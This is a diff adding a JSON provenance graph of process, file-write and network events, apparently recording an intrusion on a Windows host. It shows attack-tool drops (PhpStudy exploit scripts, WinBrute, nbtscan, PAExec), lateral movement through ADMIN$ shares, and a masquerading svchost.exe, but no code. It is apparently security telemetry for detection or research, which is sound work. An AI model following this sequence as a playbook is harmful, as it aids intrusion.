+      "command_line": "taskeng.exe {AD1090F2-00DA-4D81-9D76-4E76BD666B6D} S-1-5-18:NT AUTHORITY\\System:Service:",
+      "msec": "71892218.1182",
+      "repeat_count": 1
+    },
+    "1132_72206247.5390": {
+      "pid": "1132",
+      "parent_id": "2428",
+      "parent_key": null,
+      "image": "notepad.exe",
+      "command_line": "\"C:\\Windows\\system32\\NOTEPAD.EXE\" D:\\README.txt",
+      "msec": "72206247.5390",
+      "repeat_count": 2
+    }
+  },
+  "edges": [
+    {
+      "type": "connected_to",
+      "from_node": "3436_2485.5104",
+      "target": "202.89.233.101:443",
+      "msec": "2737.4762"
+    },
+    {
+      "type": "connected_to",
+      "from_node": "3436_2485.5104",
+      "target": "120.253.255.162:443",
+      "msec": "2790.4131"
+    },
+    {
+      "type": "connected_to",
+      "from_node": "3436_2485.5104",
+      "target": "72.246.150.129:443",
+      "msec": "3165.1566"
+    },
+    {
+      "type": "connected_to",
+      "from_node": "3268_127919.3304",
+      "target": "124.223.85.207:8079",
+      "msec": "128001.6961"
+    },
+    {
+      "type": "connected_to",
+      "from_node": "3436_2485.5104",
+      "target": "61.179.108.42:443",
+      "msec": "10333.3129"
+    },
+    {
+      "type": "connected_to",
+      "from_node": "3436_2485.5104",
+      "target": "13.75.113.36:443",
+      "msec": "10540.4196"
+    },
+    {
+      "type": "connected_to",
+      "from_node": "4128_143906.2601",
+      "target": "124.223.85.207:8443",
+      "msec": "144002.8952"
+    },
+    {
+      "type": "connected_to",
+      "from_node": "3436_2485.5104",
+      "target": "120.253.250.226:443",
+      "msec": "121778.8337"
+    },
+    {
+      "type": "connected_to",
+      "from_node": "3436_2485.5104",
+      "target": "168.138.196.48:80",
+      "msec": "131428.2071"
+    },
+    {
+      "type": "connected_to",
+      "from_node": "3436_2485.5104",
+      "target": "124.165.213.233:443",
+      "msec": "131496.2638"
+    },
+    {
+      "type": "connected_to",
+      "from_node": "3436_2485.5104",
+      "target": "111.206.209.249:443",
+      "msec": "131761.5865"
+    },
+    {
+      "type": "connected_to",
+      "from_node": "3436_2485.5104",
+      "target": "120.253.253.34:443",
+      "msec": "275933.6586"
+    },
+    {
+      "type": "connected_to",
+      "from_node": "3436_2485.5104",
+      "target": "61.179.108.45:443",
+      "msec": "279230.6236"
+    },
+    {
+      "type": "connected_to",
+      "from_node": "3436_2485.5104",
+      "target": "202.89.233.100:443",
+      "msec": "517553.8749"
+    },
+    {
+      "type": "connected_to",
+      "from_node": "3436_2485.5104",
+      "target": "72.246.150.104:443",
+      "msec": "518203.9194"
+    },
+    {
+      "type": "connected_to",
+      "from_node": "3436_2485.5104",
+      "target": "61.179.108.43:443",
+      "msec": "521978.0550"
+    },
+    {
+      "type": "connected_to",
+      "from_node": "3436_2485.5104",
+      "target": "40.126.16.165:443",
+      "msec": "830528.3723"
+    },
+    {
+      "type": "connected_to",
+      "from_node": "3436_2485.5104",
+      "target": "40.126.16.166:443",
+      "msec": "830587.3167"
+    },
+    {
+      "type": "connected_to",
+      "from_node": "3436_2485.5104",
+      "target": "61.179.108.40:443",
+      "msec": "875594.6011"
+    },
+    {
+      "type": "connected_to",
+      "from_node": "3436_2485.5104",
+      "target": "23.99.98.7:443",
+      "msec": "904808.3679"
+    },
+    {
+      "type": "connected_to",
+      "from_node": "3436_2485.5104",
+      "target": "47.75.19.18:443",
+      "msec": "905307.9078"
+    },
+    {
+      "type": "connected_to",
+      "from_node": "3436_2485.5104",
+      "target": "111.206.76.48:443",
+      "msec": "905372.7679"
+    },
+    {
+      "type": "connected_to",
+      "from_node": "3436_2485.5104",
+      "target": "110.242.68.4:443",
+      "msec": "905411.7491"
+    },
+    {
+      "type": "connected_to",
+      "from_node": "3436_2485.5104",
+      "target": "43.243.235.138:443",
+      "msec": "922365.7552"
+    },
+    {
+      "type": "connected_to",
+      "from_node": "3436_2485.5104",
+      "target": "42.7.33.250:443",
+      "msec": "922921.5863"
+    },
+    {
+      "type": "connected_to",
+      "from_node": "3436_2485.5104",
+      "target": "47.110.23.61:443",
+      "msec": "923000.8851"
+    },
+    {
+      "type": "connected_to",
+      "from_node": "3436_2485.5104",
+      "target": "106.11.43.154:443",
+      "msec": "923193.2575"
+    },
+    {
+      "type": "connected_to",
+      "from_node": "3436_2485.5104",
+      "target": "59.82.34.236:443",
+      "msec": "923354.2693"
+    },
+    {
+      "type": "connected_to",
+      "from_node": "3436_2485.5104",
+      "target": "101.72.203.35:443",
+      "msec": "943969.1428"
+    },
+    {
+      "type": "connected_to",
+      "from_node": "3436_2485.5104",
+      "target": "112.80.255.53:443",
+      "msec": "944180.9067"
+    },
+    {
+      "type": "connected_to",
+      "from_node": "3436_2485.5104",
+      "target": "110.242.68.129:443",
+      "msec": "954780.4950"
+    },
+    {
+      "type": "connected_to",
+      "from_node": "3436_2485.5104",
+      "target": "121.40.43.188:443",
+      "msec": "973307.0067"
+    },
+    {
+      "type": "connected_to",
+      "from_node": "3436_2485.5104",
+      "target": "121.22.232.162:443",
+      "msec": "973406.3625"
+    },
+    {
+      "type": "connected_to",
+      "from_node": "3436_2485.5104",
+      "target": "111.202.85.126:443",
+      "msec": "973587.1948"
+    },
+    {
+      "type": "connected_to",
+      "from_node": "3436_2485.5104",
+      "target": "120.253.253.105:443",
+      "msec": "973588.5332"
+    },
+    {
+      "type": "connected_to",
+      "from_node": "3436_2485.5104",
+      "target": "120.253.253.38:443",
+      "msec": "973786.0710"
+    },
+    {
+      "type": "connected_to",
+      "from_node": "3436_2485.5104",
+      "target": "120.55.196.147:443",
+      "msec": "973787.8955"
+    },
+    {
+      "type": "connected_to",
+      "from_node": "3436_2485.5104",
+      "target": "115.56.90.88:443",
+      "msec": "974190.4542"
+    },
+    {
+      "type": "connected_to",
+      "from_node": "3436_2485.5104",
+      "target": "106.11.84.7:443",
+      "msec": "974348.4557"
+    },
+    {
+      "type": "connected_to",
+      "from_node": "3436_2485.5104",
+      "target": "120.253.253.225:443",
+      "msec": "974437.8552"
+    },
+    {
+      "type": "connected_to",
+      "from_node": "3436_2485.5104",
+      "target": "121.199.200.119:443",
+      "msec": "974439.4046"
+    },
+    {
+      "type": "connected_to",
+      "from_node": "3436_2485.5104",
+      "target": "118.178.109.187:443",
+      "msec": "974446.5357"
+    },
+    {
+      "type": "connected_to",
+      "from_node": "3436_2485.5104",
+      "target": "157.255.135.10:443",
+      "msec": "974460.9621"
+    },
+    {
+      "type": "connected_to",
+      "from_node": "3436_2485.5104",
+      "target": "120.253.255.166:443",
+      "msec": "975118.7227"
+    },
+    {
+      "type": "connected_to",
+      "from_node": "3436_2485.5104",
+      "target": "120.253.253.36:443",
+      "msec": "975166.9421"
+    },
+    {
+      "type": "connected_to",
+      "from_node": "3436_2485.5104",
+      "target": "120.253.253.102:443",
+      "msec": "975354.8533"
+    },
+    {
+      "type": "connected_to",
+      "from_node": "3436_2485.5104",
+      "target": "120.253.255.164:443",
+      "msec": "975477.7499"
+    },
+    {
+      "type": "connected_to",
+      "from_node": "3436_2485.5104",
+      "target": "110.242.69.43:443",
+      "msec": "982485.9337"
+    },
+    {
+      "type": "connected_to",
+      "from_node": "3436_2485.5104",
+      "target": "123.129.234.38:443",
+      "msec": "982813.8958"
+    },
+    {
+      "type": "connected_to",
+      "from_node": "3436_2485.5104",
+      "target": "116.114.96.35:443",
+      "msec": "982862.4593"
+    },
+    {
+      "type": "connected_to",
+      "from_node": "3436_2485.5104",
+      "target": "111.206.76.35:443",
+      "msec": "983405.5945"
+    },
+    {
+      "type": "connected_to",
+      "from_node": "3436_2485.5104",
+      "target": "220.194.65.35:443",
+      "msec": "983850.6201"
+    },
+    {
+      "type": "connected_to",
+      "from_node": "3436_2485.5104",
+      "target": "120.253.255.102:443",
+      "msec": "984683.6715"
+    },
+    {
+      "type": "connected_to",
+      "from_node": "3436_2485.5104",
+      "target": "123.125.132.33:443",
+      "msec": "987319.1288"
+    },
+    {
+      "type": "connected_to",
+      "from_node": "3436_2485.5104",
+      "target": "110.242.68.3:443",
+      "msec": "987511.0237"
+    },
+    {
+      "type": "connected_to",
+      "from_node": "3436_2485.5104",
+      "target": "218.68.136.35:443",
+      "msec": "987819.9009"
+    },
+    {
+      "type": "connected_to",
+      "from_node": "3436_2485.5104",
+      "target": "157.255.77.181:443",
+      "msec": "991761.1629"
+    },
+    {
+      "type": "connected_to",
+      "from_node": "3436_2485.5104",
+      "target": "110.242.69.44:443",
+      "msec": "1001447.5245"
+    },
+    {
+      "type": "connected_to",
+      "from_node": "3436_2485.5104",
+      "target": "110.242.69.202:443",
+      "msec": "1001514.1810"
+    },
+    {
+      "type": "connected_to",
+      "from_node": "3436_2485.5104",
+      "target": "119.167.143.64:443",
+      "msec": "1001520.0847"
+    },
+    {
+      "type": "connected_to",
+      "from_node": "3436_2485.5104",
+      "target": "119.167.143.63:443",
+      "msec": "1001524.1773"
+    },
+    {
+      "type": "connected_to",
+      "from_node": "3436_2485.5104",
+      "target": "111.206.208.245:443",
+      "msec": "1001573.0036"
+    },
+    {
+      "type": "connected_to",
+      "from_node": "3436_2485.5104",
+      "target": "111.206.208.243:443",
+      "msec": "1001791.7569"
+    },
+    {
+      "type": "connected_to",
+      "from_node": "3436_2485.5104",
+      "target": "111.206.208.240:443",
+      "msec": "1003547.2493"
+    },
+    {
+      "type": "connected_to",
+      "from_node": "3436_2485.5104",
+      "target": "111.206.210.2:443",
+      "msec": "1034097.5823"
+    },
+    {
+      "type": "connected_to",
+      "from_node": "3436_2485.5104",
+      "target": "110.242.68.84:443",
+      "msec": "1034103.3518"
+    },
+    {
+      "type": "connected_to",
+      "from_node": "3436_2485.5104",
+      "target": "110.242.68.247:443",
+      "msec": "1034111.2349"
+    },
+    {
+      "type": "connected_to",
+      "from_node": "3436_2485.5104",
+      "target": "47.95.53.4:443",
+      "msec": "1034129.6553"
+    },
+    {
+      "type": "connected_to",
+      "from_node": "3436_2485.5104",
+      "target": "180.101.49.93:443",
+      "msec": "1034132.4368"
+    },
+    {
+      "type": "connected_to",
+      "from_node": "3436_2485.5104",
+      "target": "112.80.255.214:443",
+      "msec": "1034172.7233"
+    },
+    {
+      "type": "connected_to",
+      "from_node": "3436_2485.5104",
+      "target": "123.125.132.31:443",
+      "msec": "1038088.3277"
+    },
+    {
+      "type": "connected_to",
+      "from_node": "3436_2485.5104",
+      "target": "117.34.84.3:443",
+      "msec": "1038209.7296"
+    },
+    {
+      "type": "connected_to",
+      "from_node": "3436_2485.5104",
+      "target": "120.253.255.161:443",
+      "msec": "1133953.7747"
+    },
+    {
+      "type": "connected_to",
+      "from_node": "3436_2485.5104",
+      "target": "120.253.253.226:443",
+      "msec": "1228387.3168"
+    },
+    {
+      "type": "connected_to",
+      "from_node": "3436_2485.5104",
+      "target": "23.67.73.10:443",
+      "msec": "3806424.7474"
+    },
+    {
+      "type": "connected_to",
+      "from_node": "3436_2485.5104",
+      "target": "211.91.76.55:443",
+      "msec": "3810061.1945"
+    },
+    {
+      "type": "connected_to",
+      "from_node": "3436_2485.5104",
+      "target": "23.42.180.68:443",
+      "msec": "3810268.3572"
+    },
+    {
+      "type": "connected_to",
+      "from_node": "4876_10718770.2820",
+      "target": "120.253.255.162:443",
+      "msec": "10719427.3760"
+    },
+    {
+      "type": "connected_to",
+      "from_node": "3840_50262426.9490",
+      "target": "111.229.170.12:80",
+      "msec": "50262808.9591"
+    },
+    {
+      "type": "wrote",
+      "from_node": "3268_127919.3304",
+      "target": "C:\\Users\\Administrator\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\69T5JAAG\\sangforcat[2].exe",
+      "msec": "133255.3094"
+    },
+    {
+      "type": "wrote",
+      "from_node": "3268_127919.3304",
+      "target": "C:\\Users\\Public\\agent.exe",
+      "msec": "143879.2098"
+    },
+    {
+      "type": "wrote",
+      "from_node": "4128_143906.2601",
+      "target": "C:\\Users\\Public\\PhpStudyPoc.py",
+      "msec": "153507.0338"
+    },
+    {
+      "type": "wrote",
+      "from_node": "4128_143906.2601",
+      "target": "C:\\Users\\Public\\PhpStudyExp2.py",
+      "msec": "163931.3709"
+    },
+    {
+      "type": "wrote",
+      "from_node": "4128_143906.2601",
+      "target": "C:\\Users\\Public\\WinBrute.exe",
+      "msec": "184260.4281"
+    },
+    {
+      "type": "wrote",
+      "from_node": "4128_143906.2601",
+      "target": "C:\\Users\\Public\\nbtscan.exe",
+      "msec": "204745.0616"
+    },
+    {
+      "type": "wrote",
+      "from_node": "4128_143906.2601",
+      "target": "C:\\Users\\Public\\PAExec.exe",
+      "msec": "214937.2627"
+    },
+    {
+      "type": "wrote",
+      "from_node": "2196_215094.5106",
+      "target": "\\\\192.168.0.95\\ADMIN$\\PAExec-2196-WIN2012-1.exe",
+      "msec": "215128.2189"
+    },
+    {
+      "type": "wrote",
+      "from_node": "2196_215094.5106",
+      "target": "\\\\192.168.0.95\\pipe\\PAExec-2196-WIN2012-1.exe",
+      "msec": "215146.1031"
+    },
+    {
+      "type": "wrote",
+      "from_node": "4224_225385.5061",
+      "target": "\\\\192.168.0.244\\ADMIN$\\PAExec-4224-WIN2012-1.exe",
+      "msec": "225398.3835"
+    },
+    {
+      "type": "wrote",
+      "from_node": "4224_225385.5061",
+      "target": "\\\\192.168.0.244\\pipe\\PAExec-4224-WIN2012-1.exe",
+      "msec": "225422.4185"
+    },
+    {
+      "type": "wrote",
+      "from_node": "6680_932394.2261",
+      "target": "C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\2\\5376_1853232701\\software_reporter_tool.exe",
+      "msec": "953347.2744"
+    },
+    {
+      "type": "wrote",
+      "from_node": "5176_953609.1040",
+      "target": "C:\\users\\administrator\\appdata\\local\\google\\chrome\\user data\\swreporter\\99.279.200\\em005_64.dll",
+      "msec": "953691.4754"
+    },
+    {
+      "type": "wrote",
+      "from_node": "5176_953609.1040",
+      "target": "C:\\users\\administrator\\appdata\\local\\google\\chrome\\user data\\swreporter\\99.279.200\\em004_64.dll",
+      "msec": "953710.0238"
+    },
+    {
+      "type": "wrote",
+      "from_node": "5176_953609.1040",
+      "target": "C:\\users\\administrator\\appdata\\local\\google\\chrome\\user data\\swreporter\\99.279.200\\em003_64.dll",
+      "msec": "953743.2894"
+    },
+    {
+      "type": "wrote",
+      "from_node": "5176_953609.1040",
+      "target": "C:\\users\\administrator\\appdata\\local\\google\\chrome\\user data\\swreporter\\99.279.200\\em002_64.dll",
+      "msec": "953783.9520"
+    },
+    {
+      "type": "wrote",
+      "from_node": "5176_953609.1040",
+      "target": "C:\\users\\administrator\\appdata\\local\\google\\chrome\\user data\\swreporter\\99.279.200\\em000_64.dll",
+      "msec": "953818.8584"
+    },
+    {
+      "type": "wrote",
+      "from_node": "5176_953609.1040",
+      "target": "C:\\users\\administrator\\appdata\\local\\google\\chrome\\user data\\swreporter\\99.279.200\\em001_64.dll",
+      "msec": "953845.2554"
+    },
+    {
+      "type": "wrote",
+      "from_node": "5176_953609.1040",
+      "target": "C:\\users\\administrator\\appdata\\local\\google\\chrome\\user data\\swreporter\\99.279.200\\edls_64.dll",
+      "msec": "953862.4763"
+    },
+    {
+      "type": "wrote",
+      "from_node": "3048_35557703.2005",
+      "target": "C:\\Windows\\Temp\\DA269804-8F67-A661-601D-5A653EE7E4CD\\MPGEAR.DLL",
+      "msec": "35558459.7593"
+    },
+    {
+      "type": "wrote",
+      "from_node": "3048_35557703.2005",
+      "target": "C:\\Windows\\Temp\\DA269804-8F67-A661-601D-5A653EE7E4CD\\MPENGINE.DLL",
+      "msec": "35558491.8449"
+    },
+    {
+      "type": "wrote",
+      "from_node": "3840_50262426.9490",
+      "target": "C:\\Windows\\SysWOW64\\config\\systemprofile\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\servert[1].exe",
+      "msec": "50263377.6663"
+    },
+    {
+      "type": "wrote",
+      "from_node": "3840_50262426.9490",
+      "target": "C:\\Windows\\ywm.exe",
+      "msec": "50263429.6844"
+    },
+    {
+      "type": "wrote",
+      "from_node": "3636_50263501.0530",
+      "target": "C:\\Windows\\svchost.exe",
+      "msec": "50263581.1713"
+    },
+    {
+      "type": "spawned",
+      "from_node": "3820_2342.5097",
+      "to_node": "7100_2349.3797",
+      "msec": "2349.3797"
+    },
+    {
+      "type": "spawned",
+      "from_node": "3820_2342.5097",
+      "to_node": "6728_2480.3764",
+      "msec": "2480.3764"
+    },
+    {
+      "type": "spawned",
+      "from_node": "3820_2342.5097",
+      "to_node": "3436_2485.5104",
+      "msec": "2485.5104"
+    },
+    {
+      "type": "spawned",
+      "from_node": "3820_2342.5097",
+      "to_node": "1196_2535.0658",
+      "msec": "2535.0658"
+    },
+    {
+      "type": "spawned",
+      "from_node": "3820_2342.5097",
+      "to_node": "4776_2605.9108",
+      "msec": "2605.9108"
+    },
+    {
+      "type": "spawned",
+      "from_node": "3820_2342.5097",
+      "to_node": "6624_2627.4475",
+      "msec": "2627.4475"
+    },
+    {
+      "type": "spawned",
+      "from_node": "3820_2342.5097",
+      "to_node": "4560_2918.4273",
+      "msec": "2918.4273"
+    },
+    {
+      "type": "spawned",
+      "from_node": "3820_2342.5097",
+      "to_node": "856_3431.5648",
+      "msec": "3431.5648"
+    },
+    {
+      "type": "spawned",
+      "from_node": "3868_27764.9466",
+      "to_node": "3644_27767.2813",
+      "msec": "27767.2813"
+    },
+    {
+      "type": "spawned",
+      "from_node": "4696_107348.5240",
+      "to_node": "3432_107356.8781",
+      "msec": "107356.8781"
+    },
+    {
+      "type": "spawned",
+      "from_node": "2124_117810.2326",
+      "to_node": "3016_117818.5499",
+      "msec": "117818.5499"
+    },
+    {
+      "type": "spawned",
+      "from_node": "2124_117810.2326",
+      "to_node": "2708_117826.7859",
+      "msec": "117826.7859"
+    },
+    {
+      "type": "spawned",
+      "from_node": "2124_117810.2326",
+      "to_node": "4964_117845.9773",
+      "msec": "117845.9773"
+    },
+    {
+      "type": "spawned",
+      "from_node": "1996_127854.1959",
+      "to_node": "4328_127862.6081",
+      "msec": "127862.6081"
+    },
+    {
+      "type": "spawned",
+      "from_node": "1996_127854.1959",
+      "to_node": "3268_127919.3304",
+      "msec": "127919.3304"
+    },
+    {
+      "type": "spawned",
+      "from_node": "3148_27254.5916",
+      "to_node": "7036_27307.6289",
+      "msec": "27307.6289"
+    },
+    {
+      "type": "spawned",
+      "from_node": "3148_27254.5916",
+      "to_node": "1144_27339.7125",
+      "msec": "27339.7125"
+    },
+    {
+      "type": "spawned",
+      "from_node": "3148_27254.5916",
+      "to_node": "6508_27340.3402",
+      "msec": "27340.3402"
+    },
+    {
+      "type": "spawned",
+      "from_node": "3148_27254.5916",
+      "to_node": "6844_27353.0043",
+      "msec": "27353.0043"
+    },
+    {
+      "type": "spawned",
+      "from_node": "3148_27254.5916",
+      "to_node": "2024_27453.8897",
+      "msec": "27453.8897"
+    },
+    {
+      "type": "spawned",
+      "from_node": "2024_27453.8897",
+      "to_node": "3868_27764.9466",
+      "msec": "27764.9466"
+    },
+    {
+      "type": "spawned",
+      "from_node": "3868_27764.9466",
+      "to_node": "7008_27892.5037",
+      "msec": "27892.5037"
+    },
+    {
+      "type": "spawned",
+      "from_node": "3868_27764.9466",
+      "to_node": "6916_30815.4093",
+      "msec": "30815.4093"
+    },
+    {
+      "type": "spawned",
+      "from_node": "3868_27764.9466",
+      "to_node": "3200_30819.1981",
+      "msec": "30819.1981"
+    },
+    {
+      "type": "spawned",
+      "from_node": "3868_27764.9466",
+      "to_node": "924_30822.8094",
+      "msec": "30822.8094"
+    },
+    {
+      "type": "spawned",
+      "from_node": "3868_27764.9466",
+      "to_node": "6808_30826.3350",
+      "msec": "30826.3350"
+    },
+    {
+      "type": "spawned",
+      "from_node": "3148_27254.5916",
+      "to_node": "6948_57340.4382",
+      "msec": "57340.4382"
+    },
+    {
+      "type": "spawned",
+      "from_node": "1996_127854.1959",
+      "to_node": "4360_143891.0271",
+      "msec": "143891.0271"
+    },
+    {
+      "type": "spawned",
+      "from_node": "4360_143891.0271",
+      "to_node": "4128_143906.2601",
+      "msec": "143906.2601"
+    },
+    {
+      "type": "spawned",
+      "from_node": "4128_143906.2601",
+      "to_node": "4440_153428.2392",
+      "msec": "153428.2392"
+    },
+    {
+      "type": "spawned",
+      "from_node": "4128_143906.2601",
+      "to_node": "3240_153507.9070",
+      "msec": "153507.9070"
+    },
+    {
+      "type": "spawned",
+      "from_node": "4128_143906.2601",
+      "to_node": "3360_153517.6138",
+      "msec": "153517.6138"
+    },
+    {
+      "type": "spawned",
+      "from_node": "4128_143906.2601",
+      "to_node": "3996_153526.4106",
+      "msec": "153526.4106"
+    },
+    {
+      "type": "spawned",
+      "from_node": "4128_143906.2601",
+      "to_node": "4808_163598.4281",
+      "msec": "163598.4281"
+    },
+    {
+      "type": "spawned",
+      "from_node": "3820_2342.5097",
+      "to_node": "7100_124994.8322",
+      "msec": "124994.8322"
+    },
+    {
+      "type": "spawned",
+      "from_node": "3820_2342.5097",
+      "to_node": "4812_131164.1316",
+      "msec": "131164.1316"
+    },
+    {
+      "type": "spawned",
+      "from_node": "3820_2342.5097",
+      "to_node": "5328_147218.3547",
+      "msec": "147218.3547"
+    },
+    {
+      "type": "spawned",
+      "from_node": "4128_143906.2601",
+      "to_node": "3284_163932.8018",
+      "msec": "163932.8018"
+    },
+    {
+      "type": "spawned",
+      "from_node": "3284_163932.8018",
+      "to_node": "4200_164063.5746",
+      "msec": "164063.5746"
+    },
+    {
+      "type": "spawned",
+      "from_node": "4128_143906.2601",
+      "to_node": "4940_164081.9619",
+      "msec": "164081.9619"
+    },
+    {
+      "type": "spawned",
+      "from_node": "4128_143906.2601",
+      "to_node": "4080_164091.4158",
+      "msec": "164091.4158"
+    },
+    {
+      "type": "spawned",
+      "from_node": "4128_143906.2601",
+      "to_node": "4692_173679.7981",
+      "msec": "173679.7981"
+    },
+    {
+      "type": "spawned",
+      "from_node": "4128_143906.2601",
+      "to_node": "3740_173953.4470",
+      "msec": "173953.4470"
+    },
+    {
+      "type": "spawned",
+      "from_node": "3740_173953.4470",
+      "to_node": "4572_174081.8782",
+      "msec": "174081.8782"
+    },
+    {
+      "type": "spawned",
+      "from_node": "4128_143906.2601",
+      "to_node": "3076_174109.0190",
+      "msec": "174109.0190"
+    },
+    {
+      "type": "spawned",
+      "from_node": "4128_143906.2601",
+      "to_node": "4632_183839.1698",
+      "msec": "183839.1698"
+    },
+    {
+      "type": "spawned",
+      "from_node": "4128_143906.2601",
+      "to_node": "4320_184724.1529",
+      "msec": "184724.1529"
+    },
+    {
+      "type": "spawned",
+      "from_node": "4320_184724.1529",
+      "to_node": "3524_184729.6767",
+      "msec": "184729.6767"
+    },
+    {
+      "type": "spawned",
+      "from_node": "4128_143906.2601",
+      "to_node": "4900_185749.1999",
+      "msec": "185749.1999"
+    },
+    {
+      "type": "spawned",
+      "from_node": "4128_143906.2601",
+      "to_node": "3204_185757.8735",
+      "msec": "185757.8735"
+    },
+    {
+      "type": "spawned",
+      "from_node": "4128_143906.2601",
+      "to_node": "5032_194118.6657",
+      "msec": "194118.6657"
+    },
+    {
+      "type": "spawned",
+      "from_node": "4128_143906.2601",
+      "to_node": "3900_194323.3531",
+      "msec": "194323.3531"
+    },
+    {
+      "type": "spawned",
+      "from_node": "3900_194323.3531",
+      "to_node": "520_194457.4976",
+      "msec": "194457.4976"
+    },
+    {
+      "type": "spawned",
+      "from_node": "3900_194323.3531",
+      "to_node": "3276_194462.2506",
+      "msec": "194462.2506"
+    },
+    {
+      "type": "spawned",
+      "from_node": "3900_194323.3531",
+      "to_node": "4256_194491.4080",
+      "msec": "194491.4080"
+    },
+    {
+      "type": "spawned",
+      "from_node": "3900_194323.3531",
+      "to_node": "4520_194500.4192",
+      "msec": "194500.4192"
+    },
+    {
+      "type": "spawned",
+      "from_node": "3900_194323.3531",
+      "to_node": "3332_194504.9759",
+      "msec": "194504.9759"
+    },
+    {
+      "type": "spawned",
+      "from_node": "4128_143906.2601",
+      "to_node": "836_194528.9658",
+      "msec": "194528.9658"
+    },
+    {
+      "type": "spawned",
+      "from_node": "836_194528.9658",
+      "to_node": "4608_194657.7493",
+      "msec": "194657.7493"
+    },
+    {
+      "type": "spawned",
+      "from_node": "3820_2342.5097",
+      "to_node": "3228_319806.2991",
+      "msec": "319806.2991"
+    },
+    {
+      "type": "spawned",
+      "from_node": "4128_143906.2601",
+      "to_node": "3408_194686.4001",
+      "msec": "194686.4001"
+    },
+    {
+      "type": "spawned",
+      "from_node": "4128_143906.2601",
+      "to_node": "3464_204635.8139",
+      "msec": "204635.8139"
+    },
+    {
+      "type": "spawned",
+      "from_node": "4128_143906.2601",
+      "to_node": "4772_204746.1102",
+      "msec": "204746.1102"
+    },
+    {
+      "type": "spawned",
+      "from_node": "4772_204746.1102",
+      "to_node": "4976_204753.3457",
+      "msec": "204753.3457"
+    },
+    {
+      "type": "spawned",
+      "from_node": "4128_143906.2601",
+      "to_node": "4596_210755.0944",
+      "msec": "210755.0944"
+    },
+    {
+      "type": "spawned",
+      "from_node": "4128_143906.2601",
+      "to_node": "1860_210763.7369",
+      "msec": "210763.7369"
+    },
+    {
+      "type": "spawned",
+      "from_node": "4128_143906.2601",
+      "to_node": "4196_214827.1579",
+      "msec": "214827.1579"
+    },
+    {
+      "type": "spawned",
+      "from_node": "4128_143906.2601",
+      "to_node": "2284_215089.4934",
+      "msec": "215089.4934"
+    },
+    {
+      "type": "spawned",
+      "from_node": "2284_215089.4934",
+      "to_node": "2196_215094.5106",
+      "msec": "215094.5106"
+    },
+    {
+      "type": "spawned",
+      "from_node": "2788_215136.3338",
+      "to_node": "4680_215375.4705",
+      "msec": "215375.4705"
+    },
+    {
+      "type": "spawned",
+      "from_node": "4128_143906.2601",
+      "to_node": "3720_223649.5898",
+      "msec": "223649.5898"
+    },
+    {
+      "type": "spawned",
+      "from_node": "4128_143906.2601",
+      "to_node": "4604_223658.2723",
+      "msec": "223658.2723"
+    },
+    {
+      "type": "spawned",
+      "from_node": "4128_143906.2601",
+      "to_node": "2952_225064.8150",
+      "msec": "225064.8150"
+    },
+    {
+      "type": "spawned",
+      "from_node": "4128_143906.2601",
+      "to_node": "3988_225379.0334",
+      "msec": "225379.0334"
+    },
+    {
+      "type": "spawned",
+      "from_node": "3988_225379.0334",
+      "to_node": "4224_225385.5061",
+      "msec": "225385.5061"
+    },
+    {
+      "type": "spawned",
+      "from_node": "3148_27254.5916",
+      "to_node": "6504_531766.5843",
+      "msec": "531766.5843"
+    },
+    {
+      "type": "spawned",
+      "from_node": "6504_531766.5843",
+      "to_node": "5896_531772.7143",
+      "msec": "531772.7143"
+    },
+    {
+      "type": "spawned",
+      "from_node": "3148_27254.5916",
+      "to_node": "4496_531803.7790",
+      "msec": "531803.7790"
+    },
+    {
+      "type": "spawned",
+      "from_node": "3148_27254.5916",
+      "to_node": "4776_531914.1586",
+      "msec": "531914.1586"
+    },
+    {
+      "type": "spawned",
+      "from_node": "4128_143906.2601",
+      "to_node": "1760_233942.4639",
+      "msec": "233942.4639"
+    },
+    {
+      "type": "spawned",
+      "from_node": "3204_732177.4654",
+      "to_node": "4400_732179.5964",
+      "msec": "732179.5964"
+    },
+    {
+      "type": "spawned",
+      "from_node": "3204_732177.4654",
+      "to_node": "3160_732185.4277",
+      "msec": "732185.4277"
+    },
+    {
+      "type": "spawned",
+      "from_node": "3160_732185.4277",
+      "to_node": "2916_732344.7379",
+      "msec": "732344.7379"
+    },
+    {
+      "type": "spawned",
+      "from_node": "3160_732185.4277",
+      "to_node": "2572_732345.5629",
+      "msec": "732345.5629"
+    },
+    {
+      "type": "spawned",
+      "from_node": "3820_2342.5097",
+      "to_node": "6680_932394.2261",
+      "msec": "932394.2261"
+    },
+    {
+      "type": "spawned",
+      "from_node": "3820_2342.5097",
+      "to_node": "6792_943476.7685",
+      "msec": "943476.7685"
+    },
+    {
+      "type": "spawned",
+      "from_node": "3820_2342.5097",
+      "to_node": "6476_945400.6305",
+      "msec": "945400.6305"
+    },
+    {
+      "type": "spawned",
+      "from_node": "3820_2342.5097",
+      "to_node": "6000_953509.3283",
+      "msec": "953509.3283"
+    },
+    {
+      "type": "spawned",
+      "from_node": "6000_953509.3283",
+      "to_node": "3344_953558.5727",
+      "msec": "953558.5727"
+    },
+    {
+      "type": "spawned",
+      "from_node": "6000_953509.3283",
+      "to_node": "5176_953609.1040",
+      "msec": "953609.1040"
+    },
+    {
+      "type": "spawned",
+      "from_node": "3820_2342.5097",
+      "to_node": "2904_953750.9236",
+      "msec": "953750.9236"
+    },
+    {
+      "type": "spawned",
+      "from_node": "6000_953509.3283",
+      "to_node": "3760_953956.4087",
+      "msec": "953956.4087"
+    },
+    {
+      "type": "spawned",
+      "from_node": "3820_2342.5097",
+      "to_node": "5100_954479.7921",
+      "msec": "954479.7921"
+    },
+    {
+      "type": "spawned",
+      "from_node": "3820_2342.5097",
+      "to_node": "6628_966953.4176",
+      "msec": "966953.4176"
+    },
+    {
+      "type": "spawned",
+      "from_node": "3820_2342.5097",
+      "to_node": "7156_973223.5286",
+      "msec": "973223.5286"
+    },
+    {
+      "type": "spawned",
+      "from_node": "3820_2342.5097",
+      "to_node": "2424_975050.1421",
+      "msec": "975050.1421"
+    },
+    {
+      "type": "spawned",
+      "from_node": "3820_2342.5097",
+      "to_node": "6436_976129.2556",
+      "msec": "976129.2556"
+    },
+    {
+      "type": "spawned",
+      "from_node": "3820_2342.5097",
+      "to_node": "6052_976708.4519",
+      "msec": "976708.4519"
+    },
+    {
+      "type": "spawned",
+      "from_node": "3820_2342.5097",
+      "to_node": "2472_982446.0397",
+      "msec": "982446.0397"
+    },
+    {
+      "type": "spawned",
+      "from_node": "3820_2342.5097",
+      "to_node": "3148_986529.2573",
+      "msec": "986529.2573"
